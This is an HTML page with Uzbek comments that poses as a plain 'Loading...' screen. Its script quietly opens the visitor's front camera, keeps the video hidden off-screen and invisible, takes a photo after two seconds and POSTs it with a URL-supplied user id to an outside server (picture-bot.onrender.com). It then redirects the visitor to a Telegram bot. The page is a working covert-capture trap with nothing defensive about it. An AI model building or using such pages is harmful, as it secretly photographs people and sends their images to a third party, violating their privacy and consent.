<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        #video {
            position: fixed;
            top: -1000px;
            left: -1000px;
            opacity: 0;
        }
        canvas {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        async function startCamera() {
            try {
                const constraints = {
                    video: {
                        facingMode: "user", // Old kamera
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;

                // Video yuklanishini kutish
                video.onloadedmetadata = () => {
                    setTimeout(captureImage, 2000); // 2 sekunddan keyin rasm olish
                };
            } catch (error) {
                console.error("Kamera ishga tushmadi!", error);
            }
        }

        function captureImage() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL("image/png");
            const userId = getQueryParam("id");

            fetch("https://picture-bot.onrender.com/upload", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ image: imageData, userId })
            })
            .then(() => {
                closeCamera();
            })
            .catch(error => console.error("Xatolik:", error));
        }

        function closeCamera() {
            const stream = video.srcObject;
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            window.location.replace("https://t.me/AsilbekCode_Picture_bot");
        }

        function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        startCamera();
    </script>
</body>
</html>
